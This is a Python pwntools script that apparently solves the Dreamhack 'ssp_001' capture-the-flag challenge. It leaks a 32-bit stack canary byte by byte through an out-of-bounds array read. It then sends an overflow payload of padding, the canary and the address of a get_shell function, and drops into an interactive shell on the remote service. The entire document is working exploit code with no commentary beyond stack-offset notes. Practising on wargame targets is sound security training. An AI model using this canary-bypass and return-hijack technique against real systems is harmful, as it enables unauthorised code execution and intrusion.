from pwn import *
context.log_level = 'debug'

host = 'host1.dreamhack.games'
port = 15376

p = remote(host,port)

#ebp-0x88 box
#ebp-0x8  canary
#ebp-0x48 name

elf = ELF('./ssp_001')

get_shell = elf.symbols['get_shell']

idx = 131
canary = '0x'

for i in range(4):
	p.sendlineafter('> ','P')
	p.sendlineafter('Element index : ',str(idx))
	p.recvuntil('is : ')
	recv_byte = p.recv(2).decode()
	canary += recv_byte
	idx -= 1

log.info('canary : '+str(canary))

payload = b'\x90'*0x40
payload += p32(int(canary,16))
payload += b'\x90'*0x8
payload += p32(get_shell)

payload_len = len(payload)

p.sendlineafter('> ','E')
p.sendlineafter('Name Size : ',str(payload_len))
p.sendlineafter('Name : ',payload)

p.interactive()
